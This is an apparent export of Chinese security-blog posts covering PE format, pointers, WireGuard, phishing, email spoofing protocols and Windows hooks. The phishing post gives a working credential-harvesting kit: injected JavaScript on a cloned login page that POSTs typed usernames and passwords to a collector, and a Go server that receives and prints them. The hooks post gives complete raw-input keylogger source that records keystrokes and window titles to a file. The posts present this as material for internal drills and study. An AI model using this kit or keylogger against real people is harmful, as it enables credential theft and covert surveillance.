[{"content":" PE 文件结构是一切的基础，什么是PE文件结构：\nPE文件具有较强的移植性 PE结构是一种数据组织方式 PE结构主要应用于 windows 系统 具有PE结构的文件称为 PE 文件 EXE、DLL 都是PE文件 在早期的 dos 操作系统中，文件是以 .com 格式存储在磁盘中的，由于 .com 格式的限制，.com 是最简单的可执行文件格式，仅包含可执行代码，没有其它的附加性数据，没有附加数据指定文件的入口，所以执行指令就必须安装在文件的头部，同时也没有重定位信息，不能够跨段操作，且堆栈的大小只有 64KB，还有很多其他的缺点。\n随着发展，微软就发明了新的文件格式，也就是 .exe 格式。\n在学汇编的时候，就用 SECTION 指定过程序入口信息，重定位信息等，如下：\n其中，符号地址表在PE格式里面叫导入表，简称AIT\nPE 结构的学习价值：\n逆向分析需要其支持 是加密、解密的基础 有助于程序的编写 加深对windows系统的认识 反病毒、免杀、权益保护、反调试、加壳脱壳 PE 结构如下：\nPE结构里面，已经初始化的代码、数据、重定位等信息都安装属性进行分类，放到不同的节里面，也可以说是放到 section 里面。每个节的属性和位置等信息用 IMAGE_SECTION_HEADER 结构来描述，每一个节都有一个IMAGE_SECTION_HEADER结构，所以 n×IMAGE_SECTION_HEADER 结构是一个数组。\n每个内存页都有读、写执行的属性，在PE里面，会将同样属性的数据分类放到一个节里面。\nDOS 部分 DOS 部分由 dos 头和 dos 块组成\nDOS 头 指向 dos 可执行程序部分 指向pe结构部分 dos 头结构的定义如下：\n我们随便打开一个程序，然后用 notepad++ 查看，插件 hex-editor——view in hex\n其中，4d5a 就是表示 MZ，是发现 .com 格式的人的名字的首字母简写。\n","description":"","id":2,"section":"posts","tags":[null],"title":"PE文件结构","uri":"https://0xo7.github.io/zh/posts/2024-0427-01/"},{"content":" 变量 我们声明一个变量 int x = 10;，编译器会执行以下操作：\n识别变量类型：根据关键字int，编译器确定变量x的类型为整数。 分配内存空间：编译器会在栈内存中为变量x分配足够的内存空间来存储一个整数值。 初始化变量：由于我们在声明时提供了初始值10，编译器将把初始值10存储到变量x的内存位置中。 生成符号表：编译器会在符号表中记录变量x的名称、类型和存储位置等信息，以便后续的编译和链接阶段使用。 名称解析：编译器会解析变量名x，并确保它在代码中的使用是唯一和有效的。 这样，编译器完成了变量x的声明，并在编译阶段为其分配了内存空间和初始值。在程序运行时，可以使用变量x来访问和操作存储在内存中的整数值。\n举例来说，当编译器看到以下代码：\n1 int a = 10; 它会知道 \u0026ldquo;a\u0026rdquo; 是一个整数类型的变量，需要分配4个字节的内存空间。在编译过程中，编译器会为变量 \u0026ldquo;a\u0026rdquo; 分配一个地址，这个地址会被记录在符号表中。然后在程序中使用 \u0026ldquo;a\u0026rdquo; 时，编译器会将 \u0026ldquo;a\u0026rdquo; 替换成对应的地址或寄存器操作。\n注意：\n变量名 a 在代码中是用来标识和访问数据的，但是在程序实际运行时，变量名本身并不在内存中存在。编译器会为变量 a 分配地址，这个地址可以在程序运行时被使用。当程序在运行访问变量 a 时，实际上是通过变量 a 的地址来访问数据 10。\n指针 指针就是地址，\n指针变量 指针变量是变量，定义一个指针变量，是在内存中开辟一个空间，该空间里面存放地址。\n指针类型 指针的引用和解引用 指针变量和变量指针 ","description":"","id":3,"section":"posts","tags":["指针"],"title":"指针从1到0","uri":"https://0xo7.github.io/zh/posts/2024-0418-01/"},{"content":" 重构后的源码\n","description":"基于 rayder 项目源码进行重构","id":4,"section":"posts","tags":[null],"title":"Rayder 代码重构","uri":"https://0xo7.github.io/zh/posts/2024-0416-01/"},{"content":" 特别感谢：国内最知名的 WireGuard 布道师米开朗基杨师傅，米开朗基杨师傅的教程已经非常友好了，但是在刚开始的阅读的时候还是会遇到一些问题，所以重新整合了下。\n被Linux创始人称做艺术品的组网神器——WireGuard\nWireGuard 介绍 WireGuard 是由 Jason Donenfeld 等人用 C 语言编写的一个开源 VPN 协议，被视为下一代 VPN 协议，旨在解决许多困扰 IPSec/IKEv2、OpenVPN 或 L2TP 等其他 VPN 协议的问题。它与 Tinc 和 MeshBird 等现代 VPN 产品有一些相似之处，即加密技术先进、配置简单。从 2020 年 1 月开始，它已经并入了 Linux 内核的 5.6 版本，这意味着大多数 Linux 发行版的用户将拥有一个开箱即用的 WireGuard。\n无论你是想破墙而出，还是想在服务器之间组网，WireGuard 都不会让你失望，它就是组网的『乐高积木』，就像 ZFS 是构建文件系统的『乐高积木』一样。\nWireGuard 与其他 VPN 协议的性能测试对比：\n可以看到 WireGuard 直接碾压其他 VPN 协议。再来说说 OpenVPN，大约有 10 万行代码，而 WireGuard 只有大概 4000 行代码，代码库相当精简，简直就是件艺术品啊。你再看看 OpenVPN 的性能，算了不说了。\nWireGuard 优点：\n配置精简，可直接使用默认值 只需最少的密钥管理工作，每个主机只需要 1 个公钥和 1 个私钥。 就像普通的以太网接口一样，以 Linux 内核模块的形式运行，资源占用小。 能够将部分流量或所有流量通过 VPN 传送到局域网内的任意主机。 能够在网络故障恢复之后自动重连，戳到了其他 VPN 的痛处。 比目前主流的 VPN 协议，连接速度要更快，延迟更低（见上图）。 使用了更先进的加密技术，具有前向加密和抗降级攻击的能力。 支持任何类型的二层网络通信，例如 ARP、DHCP 和 ICMP，而不仅仅是 TCP/HTTP。 可以运行在主机中为容器之间提供通信，也可以运行在容器中为主机之间提供通信。 WireGuard 不能做的事：\n类似 gossip 协议实现网络自愈。 通过信令服务器突破双重 NAT。 通过中央服务器自动分配和撤销密钥。 发送原始的二层以太网帧。 当然，你可以使用 WireGuard 作为底层协议来实现自己想要的功能，从而弥补上述这些缺憾。\nWireGuard 术语 Peer/Node/Device 在说 Peer 之前，我们先了解 WireGuard 是不分客户端和服务端的，\n","description":"WireGuard 各种术语介绍和组网教程，文章内容整合了网上优质的 WireGuard 教程并在此基础上加入了一点自己的理解","id":5,"section":"posts","tags":[null],"title":"WireGuard VPN","uri":"https://0xo7.github.io/zh/posts/2024-0414-01/"},{"content":" Pricking 的反向代理 请勿进行违法操作，以下教程仅用于企业内部钓鱼演练使用。\n下载 Pricking 项目后，可以直接对页面进行克隆，但是反向代理克隆出的网页基本都存在一定缺陷。 实际操作不推荐在 windows 系统上克隆页面 ，有时候会因为注册表等冲突，导致所有 js 模块无法加载。\n这里用 Pricking 克隆企业业务系统，执行命令：\n1 .\\pricking.exe -config ./config/config.yaml -url http://122.4.221.133:8082/ 克隆后的页面如下，验证码因浏览器同源策略无法正常加载：\n为了让验证码正常的加载出来，可以直接注入 js 代码，替换掉验证码的链接\n额外在 modules 里面编写 LoadVerCode.js 模块，具体代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // load.js console.log(\u0026#34;Loaded LoadVerCode Module ...\u0026#34;); // 创建一个 MutationObserver 实例，监听 DOM 的变化 var observer = new MutationObserver(function(mutationsList) { // 遍历每一个 DOM 变化 mutationsList.forEach(function(mutation) { // 检查是否是某个节点的属性变化 if (mutation.type === \u0026#39;attributes\u0026#39;) { // 检查是否是图片元素的 src 属性变化 if (mutation.attributeName === \u0026#39;src\u0026#39;) { // 获取被修改的图片元素 var target = mutation.target; // 检查图片的 src 属性是否以特定的 URL 开头或者包含特定的 URL if (target.src.startsWith(\u0026#34;http://122.4.221.133:14034/\u0026#34;) || target.src.includes(\u0026#34;http://122.4.221.133:14034/\u0026#34;)) { // 如果是，则将其替换为指定的 URL target.src = \u0026#34;/pricking_static_files/captcha.jpg\u0026#34;; } } } }); }); // 在整个文档上启动监听器，监听子节点的属性变化 observer.observe(document.documentElement, { attributes: true, // 监听属性的变化 attributeFilter: [\u0026#39;src\u0026#39;], // 仅监听 src 属性的变化 subtree: true // 监听整个文档树的变化 }); /* 在页面加载完成后执行 window.onload = function() { console.log(\u0026#34;页面加载完成！\u0026#34;); }; */ 注入 js 后即显示正常验证码，如下：\n为了抓取输入框的账号和密码，还需要编写 FFData.js （FetchFormData.js）的内容，具体如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 console.log(\u0026#34;Loaded GetFormData Module ...\u0026#34;); export function GetFormData(){ var click = document.getElementById(\u0026#34;submit\u0026#34;); click.removeAttribute(\u0026#34;onclick\u0026#34;); click.addEventListener(\u0026#34;click\u0026#34;,()=\u0026gt;{ var username = document.getElementById(\u0026#34;LAY-user-login-username\u0026#34;).value; var password = document.getElementById(\u0026#34;LAY-user-login-password\u0026#34;).value; // 构建要发送的数据对象 var data = { username: username, password: password }; // 使用 Fetch API 发送数据到服务器 fetch(\u0026#39;http://127.0.0.1:8080/login\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify(data) }) .then(response =\u0026gt; response.json()) .then(data =\u0026gt; { // 这里可以处理服务器响应的数据 console.log(data); loginButtonOnClickHandler(); }) .catch(error =\u0026gt; { // 处理错误 console.error(\u0026#39;Error:\u0026#39;, error); }); }) } function loginButtonOnClickHandler() { // 重定向到真实业务 window.location.href = \u0026#34;http://122.4.221.133:8082/\u0026#34;; } 编写完抓取登录框数据的 js 后，还需要编写一个服务端（server）来接收账号和密码，具体代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) type Credentials struct { Username string `json:\u0026#34;username\u0026#34;` Password string `json:\u0026#34;password\u0026#34;` } var allowedOrigin string func main() { flag.StringVar(\u0026amp;allowedOrigin, \u0026#34;u\u0026#34;, \u0026#34;http://127.0.0.1:9999\u0026#34;, \u0026#34;Allowed origin for CORS\u0026#34;) flag.Parse() http.HandleFunc(\u0026#34;/login\u0026#34;, loginHandler) http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil) } func loginHandler(w http.ResponseWriter, r *http.Request) { // 如果是 OPTIONS 请求，直接响应，不进行后续处理 if r.Method == http.MethodOptions { w.Header().Set(\u0026#34;Access-Control-Allow-Origin\u0026#34;, allowedOrigin) w.Header().Set(\u0026#34;Access-Control-Allow-Methods\u0026#34;, \u0026#34;POST, OPTIONS\u0026#34;) w.Header().Set(\u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;Content-Type\u0026#34;) w.WriteHeader(http.StatusOK) return } // 仅接受 POST 请求 if r.Method != http.MethodPost { w.WriteHeader(http.StatusMethodNotAllowed) fmt.Fprintf(w, \u0026#34;Method Not Allowed\u0026#34;) return } // 解析 JSON 请求体 var creds Credentials err := json.NewDecoder(r.Body).Decode(\u0026amp;creds) if err != nil { w.WriteHeader(http.StatusBadRequest) fmt.Fprintf(w, \u0026#34;Bad Request\u0026#34;) return } // 打印获取到的账号密码 fmt.Printf(\u0026#34;Received username: %s, password: %s\\n\u0026#34;, creds.Username, creds.Password) // 这里仅简单地将接收到的账号密码返回给客户端 jsonResponse, err := json.Marshal(creds) if err != nil { w.WriteHeader(http.StatusInternalServerError) fmt.Fprintf(w, \u0026#34;Internal Server Error\u0026#34;) return } // 返回 JSON 响应，并设置 CORS 头 w.Header().Set(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;) w.Header().Set(\u0026#34;Access-Control-Allow-Origin\u0026#34;, allowedOrigin) // 允许指定来源的跨域请求 w.WriteHeader(http.StatusOK) w.Write(jsonResponse) } ：由于可能会涉及到跨域请求，如果你伪造后的页面地址是 http://10.10.10.1:9999，而你的服务端在 10.10.10.2 上面，这样当从伪造的页面上发送登录框数据到服务端的时候，就涉及到了跨域，你需要通过 server.exe -u http://10.10.10.1:9999 来运行监听程序。\n文件下载\nToDo 预计2025年上半年全部完成\nPricking 项目源码学习\ngobiln 项目源码学习\npricking 结合 goblin 源码做二次开发\n整合 Pricking + goblin 功能 添加输入框账号密码抓取，键盘记录、前端页录屏 等操作 ","description":"水坑钓鱼项目，可用于企业钓鱼演练使用和安全意识培训使用","id":6,"section":"posts","tags":["phishing","todo"],"title":"水坑攻击","uri":"https://0xo7.github.io/zh/posts/2024-0407-01/"},{"content":" 邮件安全协议 SPF 记录 SPF（发送方策略框架），可以分为两个单独的过程：\n发送邮件一侧的管理员在其公共DNS上定义SPF信息，SPF记录里包含可以代表其域（例如ejoinclass.com）发送邮件的服务器/合作伙伴\n接收邮件的SMTP服务器一侧，该服务器会检查发件方的SPF记录，以确保接收的邮件来自批准的服务器/服务，并根据结果执行相关操作，例如接收电子邮件、丢弃或隔离\n一条典型的SPF TXT记录语法如下：\n注意：合法发件人的域 spf.protection.outlook.com 其实也是一些 ip，查询后如下\n上面的 SPF 记录就表示ip地址为 40.118.212.57、40.118.212.58 和 spf.protection.outlook.com 的服务器可以代表域名ejoinclass.com向外发送邮件。如果 182.92.185.210 想要伪造 ejoinclass.com 域名向外发送邮件，由于 182.92.185.210 这个ip没有在白名单内，所这封邮件直接会被拒绝接收（-all）\n-all：硬失败，代表邮件直接被拒绝接收\n~all：软失败，代表邮件会被接收，但是被标记为垃圾邮件\n?all：中性，一般都用不到，现在测试也都是用 ~all 软失败来测试\n发送邮件和邮件接收方处理邮件过程如下：\n发件方的域名是 ejoinclass.com，然后用户 xiaohei@ejoinclass.com 向外发送邮件，就会由 ejoinclass.com 上面的一台 exchange 邮件服务器向外发送，比如向外往 163邮箱、 qq 邮箱、Yahoo等，发件方服务器首先会发起连接，连接到收件方的服务器 收件方服务器发现一个连接后，会获得发件方服务器的ip地址，然后收件方服务器会查询 ejoinclass.com 这个域里面有没有一条SPF记录，这条SPF记录里面包含的服务器的ip地址是啥，然后收件方服务器再检查发件方服务器的公网ip地址是不是在SPF记录的允许发送方的列表里 如果是在列表里面，那么SPF验证通过，然后收件服务器会查询信誉数据库，会去查询发件方服务器的ip地址有没有被添加到信誉数据库的黑名单 如果黑名单检查也没有问题，那么发件方服务器ip是合法的，并且信誉良好，那么发件方发送的邮件就会被发送到收件人的收件箱中 在线查询spf地址：在线检查SPF、在线检查SPF\nDKIM DKIM 是一种在邮件中嵌入数字签名的技术，主要用于校验邮件标头信息，防止邮件内容被篡改伪造\nDKIM 签名\nDMARC 安全协议绕过 邮件服务器搭建 :: 注意：\nEwomail 发邮件必须要依靠 25端口 阿里云、腾讯云默认不开放25端口，即使安全策略里面把所有端口全部开启，25端口还是不开启，必须要单独申请解封25端口，但是对于阿里云的ECS服务器而言，不支持解封25端口，血亏一柏块。建议购买海外 VPS，并且开启 25 端口（后续再尝试） 默认 Ewomail 开启了邮件杀毒，占用内存相对比较高，建议关闭 centos 7上搭建步骤如下：\n首先测试是否开放25端口，220代表已经开放25端口\n1 2 yum install telnet -y telnet smtp.qq.com 25 输入如下命令，其中 ayuxy.top 为域名\nyum -y install git cd /root git clone https://gitee.com/laowu5/EwoMail.git chmod -R 777 EwoMail cd /root/EwoMail/install sh ./start.sh ayuxy.top ","description":"","id":7,"section":"posts","tags":["phishing"],"title":"邮件钓鱼","uri":"https://0xo7.github.io/zh/posts/2024-0208-01/"},{"content":" HOOK是什么？ Hook，中文里常常被译作“钩子”或者“挂钩”，其实是Windows操作系统里的一种中断消息机制。\n是一种可以改变程序执行流程的技术，也就是讲程序原有的执行流程拦截，更改程序流向，并可以执行自己新代码的技术。\n举个不恰当的例子：\n通俗来说，就是一条高速公路，我们去追击一个罪犯(要截获的消息或事件)，然后在他要经过的地方提前埋下埋伏，等到罪犯到来时，实现截获，并执行自己的操作。\n或者说我们就是坏蛋，在要道打劫好人，“此树是我栽，此路是我开，要想过此路，留下买路财”\nHook可以干什么？ Hook技术被广泛应用于安全的多个领域，比如杀毒软件的主动防御功能，涉及到对一些敏感API的监控，就需要对这些API进行Hook；窃取密码的木马病毒，为了接收键盘的输入，需要Hook键盘消息；甚至是Windows系统及一些应用程序，在打补丁时也需要用到Hook技术。\n全局钩子 全局钩子是指在整个系统范围内拦截某种事件，比如在所有进程中拦截键盘输入。全局钩子可以用来实现一些系统级别的功能，比如全局热键、全局窗口监视等。由于全局钩子会在系统中所有进程中拦截事件，因此需要相应的权限才能够使用，而且可能会影响系统性能。\n局部钩子 局部钩子是指只在某个进程中拦截事件，比如在某个窗口中拦截键盘输入。局部钩子可以用来实现一些进程级别的功能，比如在一个应用程序中增加特定的快捷键等。局部钩子的使用相对简单，不需要特殊权限，并且不会影响整个系统的性能。\n键盘钩子 禁止在 QQ 程序里面通过键盘打字 创建 DLL 项目 KeyBoardHook。其代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \u0026#34;pch.h\u0026#34; //定义全局变量 HHOOK hHook = NULL; HINSTANCE hinstance = NULL; //回调函数定义 LRESULT CALLBACK keyProc(int code, WPARAM wparm, LPARAM lparam) { char szBuffer[1024] = { 0 }; char* p = NULL; if ( code\u0026gt;0 ) { if (!(lparam \u0026amp; 0x80000000)) { GetModuleFileNameA(NULL, szBuffer,sizeof(szBuffer)); p = strrchr(szBuffer, \u0026#39;\\\\\u0026#39;); if (!_stricmp(p+1,\u0026#34;QQ.exe\u0026#34;)) { return 1; } } } return CallNextHookEx(hHook,code, wparm,lparam); //给下一个钩子或应用程序处理 } //安装钩子 extern \u0026#34;C\u0026#34; _declspec(dllexport) void HookStart() { // WH_KEYBOARD 代表钩子类型，表示键盘钩子 // KeyProc 代表回调函数 // 该DLL的实例句柄 // 最后NULL代表监控整个系统 hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, NULL); } //卸载钩子 extern \u0026#34;C\u0026#34; _declspec(dllexport) void HookStop() { if (hHook) { UnhookWindowsHookEx(hHook); } } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: //表示DLL刚被加载进来的时候 hinstance = hModule; break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 上面生成项目会生成 KeyBoardHook.dll\n注意：上面安装钩子的步骤中，需要有 extern \u0026ldquo;C\u0026rdquo;\n然后重新新建 loadhook.c，其中代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void main() { //加载DLL HMODULE dll = LoadLibraryA(\u0026#34;D:\\\\VS_Project\\\\Project1\\\\Debug\\\\KeyBoardHook.dll\u0026#34;); void (*HookStart)() = (void(*)())GetProcAddress(dll,\u0026#34;HookStart\u0026#34;); void (*HookStop)() = (void(*)())GetProcAddress(dll, \u0026#34;HookStop\u0026#34;); HookStart(); printf(\u0026#34;输入q退出\u0026#34;); while (_getch() != \u0026#39;q\u0026#39;); HookStop(); FreeLibrary(dll); } vs2019 查看 dll 是否导出\n打开命令行后，执行如下命令：\n注：执行上面代码加载 dll 后，发现所有的程序都禁止了键盘输入，而不是只有qq进程会禁止键盘输入，有点没搞懂 \u0026hellip;.\n对 DLL 进行修改，修改后的 DLL 会记录键盘内容到 c:/key.txt 文件中，如果生成的 dll 是 x86 的，那么就是记录 x86 程序下的键盘输入。同理，如果生成的 dll 是 x64 的，那么就是记录 x64 程序下的键盘输入到 key.txt 中去。具体 dll 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;conio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; void main() { //加载DLL HMODULE dll = LoadLibraryA(\u0026#34;D:\\\\VS_Project\\\\Project1\\\\Debug\\\\KeyBoardHook.dll\u0026#34;); void (*HookStart)() = (void(*)())GetProcAddress(dll, \u0026#34;HookStart\u0026#34;); void (*HookStop)() = (void(*)())GetProcAddress(dll, \u0026#34;HookStop\u0026#34;); HookStart(); printf(\u0026#34;输入q退出\u0026#34;); while (_getch() != \u0026#39;q\u0026#39;); HookStop(); FreeLibrary(dll); } 注意：实际的键盘记录通常不会采用这种方法，一般键盘记录会有更好的方法，上面的方法实际上比较笨拙\n如果我们不做键盘记录，而是仅仅锁住键盘，那么有更加简单粗暴的方式，下面的代码会锁住键盘5秒，按住ctrl+alt+delete 即可解锁\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;windows.h\u0026gt; void main() { BlockInput(TRUE); MessageBeep(16); Sleep(5000); BlockInput(FALSE); MessageBeep(48); } 原始输入设备模型 原始输入设备模型必须需要一个窗口的句柄，也就是说会把消息发送到自己程序的窗口上，可以直接新建桌面项目\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 // WindowsProject1.cpp : 定义应用程序的入口点。 // #include \u0026#34;framework.h\u0026#34; #include \u0026#34;WindowsProject1.h\u0026#34; #define MAX_LOADSTRING 100 // 全局变量: HINSTANCE hInst; // 当前实例 WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本 WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名 // 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance); BOOL InitInstance(HINSTANCE, int); LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM); INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM); BOOL InitDevice(HWND hwnd); void savekey(USHORT usVkey); void GetData(LPARAM lparam); int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) { UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此处放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_WINDOWSPROJECT1, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) { return FALSE; } HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINDOWSPROJECT1)); HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); InitDevice(hWnd); //初始化设备 MSG msg; // 主消息循环: while (GetMessage(\u0026amp;msg, nullptr, 0, 0)) { if (!TranslateAccelerator(msg.hwnd, hAccelTable, \u0026amp;msg)) { TranslateMessage(\u0026amp;msg); DispatchMessage(\u0026amp;msg); } } return (int) msg.wParam; } // // 函数: MyRegisterClass() // // 目标: 注册窗口类。 // ATOM MyRegisterClass(HINSTANCE hInstance) { WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWSPROJECT1)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_WINDOWSPROJECT1); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(\u0026amp;wcex); } // // 函数: InitInstance(HINSTANCE, int) // // 目标: 保存实例句柄并创建主窗口 // // 注释: // // 在此函数中，我们在全局变量中保存实例句柄并 // 创建和显示主程序窗口。 // BOOL InitInstance(HINSTANCE hInstance, int nCmdShow) { hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) { return FALSE; } ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE; } // // 函数: WndProc(HWND, UINT, WPARAM, LPARAM) // // 目标: 处理主窗口的消息。 // // WM_COMMAND - 处理应用程序菜单 // WM_PAINT - 绘制主窗口 // WM_DESTROY - 发送退出消息并返回 // // LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) { switch (message) { case WM_INPUT: GetData(lParam); break; case WM_COMMAND: { int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) { case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); } } break; case WM_PAINT: { PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, \u0026amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... EndPaint(hWnd, \u0026amp;ps); } break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); } return 0; } // “关于”框的消息处理程序。 INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) { UNREFERENCED_PARAMETER(lParam); switch (message) { case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) { EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; } break; } return (INT_PTR)FALSE; } //初始化设备 BOOL InitDevice(HWND hwnd) { RAWINPUTDEVICE input = { 0 }; input.usUsagePage = 0x01; //获取输入设备 input.usUsage = 0x06; input.dwFlags = RIDEV_INPUTSINK; //不管窗口有没有获取焦点，都获取到消息 input.hwndTarget = hwnd; //要获取窗口的句柄 return RegisterRawInputDevices(\u0026amp;input, 1, sizeof(RAWINPUTDEVICE)); //注册 } //初始化设备后因为要发消息，所以获取数据 void GetData(LPARAM lparam) { RAWINPUT input = {0}; UINT size = sizeof(input); GetRawInputData((HRAWINPUT)lparam, RID_INPUT, \u0026amp;input, \u0026amp;size, sizeof(RAWINPUTHEADER));//获取输入设备数据 if (input.header.dwType == RIM_TYPEKEYBOARD) { //如果是键盘按下 savekey(input.data.keyboard.VKey); } } void savekey(USHORT usVkey) { char title[1024] = { 0 }; char key[1024] = { 0 }; char text[1024] = { 0 }; FILE* p = NULL; HWND hwnd = GetForegroundWindow(); GetWindowTextA(hwnd, title, 1024); //注意：usVkey 键值是扫描码，但是扫描码和ASCII码没有联系，所以导入头文件 strcpy_s(key, strlen(GetKeyName(usVkey))+1, GetKeyName(usVkey)); sprintf_s(text, sizeof(text), \u0026#34;程序：[%s] %s\\r\\n\u0026#34;, title, key); fopen_s(\u0026amp;p, \u0026#34;D:/naizikey.txt\u0026#34;, \u0026#34;a+\u0026#34;); if (p==NULL) { GetLastError(); return; } fwrite(text, strlen(text), 1, p); fflush(p); fclose(p); } 注意在 framework.h 里面导入 VirtualKeyToAscii.h，如下是 framework.h 的内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // header.h: 标准系统包含文件的包含文件， // 或特定于项目的包含文件 // #pragma once #include \u0026#34;VirtualKeyToAscii.h\u0026#34; #include \u0026#34;targetver.h\u0026#34; #define WIN32_LEAN_AND_MEAN // 从 Windows 头文件中排除极少使用的内容 // Windows 头文件 #include \u0026lt;windows.h\u0026gt; // C 运行时头文件 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; #include \u0026lt;memory.h\u0026gt; #include \u0026lt;tchar.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; ","description":"","id":8,"section":"posts","tags":["HOOK"],"title":"Windows钩子","uri":"https://0xo7.github.io/zh/posts/2023-1227-01/"},{"content":" VirualAllocEx 可以在其它进程空间内申请内存，与 WriteProcessMemory 配合就可以在目的进程的地址空间中制造出任何代码跟数据来，如果要让制造出来的代码运行的话，有两种方式：\n一种是获取到线程的上下文环境，然后把 EIP 修改到指定值 另一种就是在其它的进程里面创建线程，即远程线程（CreateRemoteThread） 注入DLL思路：\n首先需要将远程执行的代码写到一个DLL中，然后在目标进程中申请一块内存，将DLL文件名写入进去，最后将目标进程地址空间中的 LoadLibrary 函数当作线程函数来执行，LoadLibrary 函数加载 DLL 文件后，系统会自动运行 DLL 